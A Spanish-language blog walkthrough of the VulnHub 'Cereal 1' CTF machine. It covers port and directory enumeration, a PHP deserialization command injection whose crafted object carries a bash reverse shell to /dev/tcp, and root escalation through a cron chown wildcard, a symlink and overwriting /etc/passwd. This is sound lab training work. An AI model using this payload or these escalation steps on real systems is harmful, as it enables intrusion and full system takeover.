---
layout: single
title: Cereal 1 - VulnHub
excerpt: " Difficulty: Medium... This is simply a learning step which everyone at some point crosses. This box is probably hard though – it’s certainly not for beginners. I hope you learn something new. Take your time. Have patience. And take time to learn about the environment once you pop the initial shell. "
date: 2023-03-18
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-cereal/cereal.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - Fuzzing
  - Apache
  - PHP
  - Deserialization
  - JavaScript
  - Wildcard
  - Chown
---

This is simply a learning step which everyone at some point crosses. This box is probably hard though – it’s certainly not for beginners. I hope you learn something new. Take your time. Have patience. And take time to learn about the environment once you pop the initial shell.
<br><br>
# Summary
- IP: 192.168.1.47
- OS: Linux
- Services & Applications:

```js
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 3.0.3
22/tcp    open  ssh        OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http       Apache httpd 2.4.37 (())
139/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped
3306/tcp  open  mysql?
11111/tcp open  tcpwrapped
22222/tcp open  tcpwrapped
22223/tcp open  tcpwrapped
33333/tcp open  tcpwrapped
33334/tcp open  tcpwrapped
44441/tcp open  http       Apache httpd 2.4.37 (())
44444/tcp open  tcpwrapped
55551/tcp open  tcpwrapped
55555/tcp open  tcpwrapped
```

# Recon

- Escaneo básico de puertos:  

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.1.47 -oG allPorts
```


- Escaneo profundo de puertos encontrados:  

```bash
$nmap -p21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555 -sCV 192.168.1.47 -oN targeted
```


# Análisis de página web (Port 80):


- Al entrar a la web principal vemos un texto por defecto de Apache, lo cual no nos sirve de nada, hacemos un escaneo de directorios con gobuster:

```bash
❯ gobuster dir -u 192.168.1.47 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 100
```

```js
===============================================================
2023/03/17 22:31:20 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.hta                 (Status: 403) [Size: 199]
/admin                (Status: 301) [Size: 234] [--> http://192.168.1.47/admin/]
/blog                 (Status: 301) [Size: 233] [--> http://192.168.1.47/blog/] 
/cgi-bin/             (Status: 403) [Size: 199]                                 
/phpinfo.php          (Status: 200) [Size: 76258]       
```


- Inspeccionamos el directorio "/blog" y nos encontramos con un texto el cual nos indica un dominio "http://cereal.ctf", lo agregamos al "/etc/hosts" y si seguimos haciendo un fuzzeo exhaustivo en este vector nos encontraremos con una página de WordPress con su respectiva página de login y demás recurso, esto se trata de un `Rabbit Hole`.

- Después de habernos dado cuenta de que nos encontrábamos en un `Rabbit Hole`, analizamos el otro puerto que corre también el servicio http.


# Análisis de página web (Port 44441):


- Al entrar en la página principal apuntando al dominio (http://cereal.ctf:44441) vemos el texto "Coming soon..."; aplicamos un escaneo de directorios con gobuster:

```bash
❯ gobuster dir -u http://cereal.ctf:44441 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 100
```

```js
===============================================================
2023/03/17 22:46:29 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
/index                (Status: 200) [Size: 15] 
/index.html           (Status: 200) [Size: 15] 
```

- Nada interesante, así que hacemos un escaneo de subdominios:

```bash
❯ gobuster vhost -u http://cereal.ctf:44441 -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100
```

```js
===============================================================
2023/03/17 22:47:26 Starting gobuster in VHOST enumeration mode
===============================================================
Found: secure.cereal.ctf:44441 (Status: 200) [Size: 1538]
```

- Agregamos el subdominio que hemos encontrado al "/etc/hosts" y le echamos un vistazo.

- Al entrar podemos observar una página que nos permite, en teoría, hacer ping a una dirección IP que deberá ser introducida por el usuario.

- Ingresamos nuestra dirección IP, le damos en "Ping!" y efectivamente el ping se realiza.

- Interceptamos la petición al hacer ping con `Burpsuite` y lo mandamos al Repeater para analizar que está viajando por detrás.

<br><br>
# PHP Deserialization:

- Podemos ver que se realiza una petición por POST y viaja consigo la siguiente data:


```js
obj=O%3A8%3A%22pingTest%22%3A1%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A12%3A%22192.168.1.35%22%3B%7D&ip=192.168.1.35
```

- Lo URLdecodeamos y podemos ver de forma más clara en qué consiste:

```js
obj=O:8:"pingTest":1:{s:9:"ipAddress";s:12:"192.168.1.35";}&ip=192.168.1.35
```

- Debido al formato podemos deducir que se trata de una cadena de datos `codificada en formato serializado de PHP`, para confirmar esto haremos un poco de fuzzing en este subdominio en búsqueda de información relevante:

```bash
❯ gobuster dir -u http://secure.cereal.ctf:44441 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 100 -x php
```


```js
===============================================================
2023/03/17 22:55:45 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 199]
/.hta                 (Status: 403) [Size: 199]
/.htaccess.php        (Status: 403) [Size: 199]
/.hta.php             (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htpasswd.php        (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
/php                  (Status: 200) [Size: 3699]
/style                (Status: 200) [Size: 3118]
/index.php            (Status: 200) [Size: 1536]
/index.php            (Status: 200) [Size: 1538]
/index                (Status: 200) [Size: 1538]
```


- Abrimos el recurso "/php" y veremos código JavaScript que contiene la función "serialize", lo cual nos confirma que se está haciendo un proceso de `serialización` por detrás; nos ponemos a analizar y llegamos a la conclusión de que la utilidad del "ping" anteriormente encontrada, con una petición POST en formato serializado de PHP envía un objeto de la clase "pingTest" con una dirección IP específica la cual se almacena en la key "ipAddress", junto con otra variable "ip" que también contiene la misma dirección IP.

- Hacemos una `búsqueda profunda` para encontrar posible información acerca de este proceso de serialización y deserialización que se está realizando por detrás.

```bash
❯ gobuster dir -u http://secure.cereal.ctf:44441 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100
```

```js
===============================================================
2023/03/17 23:11:40 Starting gobuster in directory enumeration mode
===============================================================
/php                  (Status: 200) [Size: 3699]
/style                (Status: 200) [Size: 3118]
/index                (Status: 200) [Size: 1538]
/back_en              (Status: 301) [Size: 247] [--> http://secure.cereal.ctf:44441/back_en/]
```

- Encontramos el directorio "/back_en", accedemos a este pero vemos un Forbidden; hacemos escaneo `profundo` de archivos y directorios:

```bash
❯ gobuster dir -u http://secure.cereal.ctf:44441/back_en/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 100 -x php,txt,js,zip,backup,bak
```

```js
===============================================================
2023/03/17 23:16:52 Starting gobuster in directory enumeration mode
===============================================================

/.hta.backup          (Status: 403) [Size: 199]
/.htaccess.js         (Status: 403) [Size: 199]
/.htaccess.zip        (Status: 403) [Size: 199]
/index.php.bak        (Status: 200) [Size: 1814]
```


- Encontramos el archivo "index.php.bak", lo abrimos y si revisamos su código fuente podremos encontrar lo que parece ser el código PHP que se encarga de todo el proceso de `serialización` y `deserialización` que habíamos encontrado:

```php
<?php

class pingTest {
	public $ipAddress = "127.0.0.1";
	public $isValid = False;
	public $output = "";

	function validate() {
		if (!$this->isValid) {
			if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
			{
				$this->isValid = True;
			}
		}
		$this->ping();

	}

	public function ping()
        {
		if ($this->isValid) {
			$this->output = shell_exec("ping -c 3 $this->ipAddress");	
		}
        }

}

if (isset($_POST['obj'])) {
	$pingTest = unserialize(urldecode($_POST['obj']));
} else {
	$pingTest = new pingTest;
}

$pingTest->validate();
```

- Con esto podemos llegar a las siguiente conclusiones:

- El código PHP crea una clase llamada "pingTest" la cual tiene `3 propiedades` (ipAddress, isValid, output) y `2 métodos` (validate, ping)
- El código PHP verifica que la información recibida por POST se trate de un `objeto serializado` para luego deserializarlo, sino, crea una instancia de la clase pingTest.
- El código PHP valida que la propiedad "ipAddress" del objeto ya deserializado se trate de una dirección IP válida (aplicando filtros), si es así, se modifica su propiedad "isValid" a "True". Nota: el método "validate" comprueba si la propiedad "isValid" es `falsa` en ese momento y solo ejecutará el código dentro del if statement si ese es el caso. Si la propiedad "isValid" ya es verdadera, entonces el método "validate" simplemente pasará a la siguiente línea de código.
- El código PHP utiliza el método "ping" verificando que el objeto ya deserializado y validado, contenga la propiedad "isValid" en `True`; si es así, ejecuta el comando del sistema "ping" seguido de la información de la propiedad "ipAddress", sino, no se ejecuta el comando.

- Sabiendo todo esto, podríamos aprovecharnos de esto mandando como información serializada de formato PHP en la petición por POST un objeto de la clase "pingTest" con la propiedad "isValid" en "True"; esto ya que como analizamos, el método "validate" solo pasa el filtro de dirección IP legítima si la propiedad "isValid" es "false", habiendo hecho eso, se usará el método "ping" el cual ejecuta el comando del sistema "ping" "utilizando la información de la propiedad "ipAddress" la cual la modificaremos también en el objeto que creamos inyectando el comando para que nos genere una reverse shell:

- Podemos crear el objeto con las propiedades dichas, serializarlo y URLencodearlo usando la siguiente script en PHP:

```bash
nano pwned.php
```

```php
<?php
class pingTest{

	public $ipAddress = ";bash -c 'bash -i >& /dev/tcp/192.168.1.35/443 0>&1'";
	public $isValid = True;
}
echo urlencode(serialize(new pingTest));
?>
```

- Ejecutamos la script y nos devolverá la información del objeto de forma serializada y URL encodeado, solo nos resta enviarlo en la petición por POST que habíamos mandado el repeater en `Burpsuite` en la data `"obj"` estando en escucha en nuestra máquina atacante.

- Habremos accedido al sistema como el usuario "apache"
<br><br>

#  ESCALANDO PRIVILEGIOS:

- Escaneamos procesos que se ejecutan en segundo plano de forma automatizada con [pspy](https://github.com/DominicBreuker/pspy/releases)y luego de varios minutos obtenemos la siguiente información:

```js
2023/03/18 05:10:01 CMD: UID=0     PID=2474   | /usr/sbin/CROND -n 
2023/03/18 05:10:01 CMD: UID=0     PID=2475   | /bin/bash /usr/share/scripts/chown.sh 
```

- El usuario "root" está ejecutando la script `"chown.sh"`, la cateamos para ver en qué consiste:

```bash
chown rocky:apache /home/rocky/public_html/*
```

- Podemos ver que como el usuario "root" se está ejecutando el comando `chown`, el cual adjudicará como propietario "rocky" y grupo "apache" a todos los archivos que se encuentran en el directorio `"/home/rocky/public_html/"`, esto haciendo uso del `comodín` asterisco `"*"`, gracias a este comodín, podemos aprovecharnos haciendo que "root" adjudique a los propietarios mencionados al archivo `"/etc/passwd"` del sistema, esto con el fin de poder modificar la contraseña del usuario "root" para pivotar a este con "su" y usar la contraseña que nosotros le hayamos puesto.

- Para esto, crearemos en el directorio "/home/rocky/public_html/" un archivo cualquiera con `enlace simbólico` que apunte al archivo "/etc/passwd" real:

```bash
$ln -s /etc/passwd passwd
```

- Con este archivo creado con `enlace simbólico` al archivo real "/etc/passwd" solo debemos esperar a que root ejecute la script automatizada por cada cierto tiempo y que otorgue como propietario "rocky" y grupo "apache" al archivo "/etc/passwd"

```bash
$watch ls -l /etc/passwd
```

```js
-rwxrwxr-x. 1 rocky apache 1549 May 29  2021 /etc/passwd
```

- Como somos del grupo `"apache"` podremos modificar el archivo; creamos una contraseña cualquiera con `openssl`:

```bash
$openssl passwd
hola
hola
```

- Copiamos el `hash` y lo pegamos en el usuario "root" del "/etc/passwd":

```js
root:X.cCReJqURo5g:0:0:root:/root:/bin/bash
```

- Ahora `pivotamos` al usuario root utilizando la contraseña que creamos aprovechando que añadimos una contraseña puntual en el "/etc/passwd" y el comando `"su"` verifica primero en este archivo y luego en el shadow para validar credenciales.

```bash
$su root
hola
```

- Hecho esto seremos `root`.
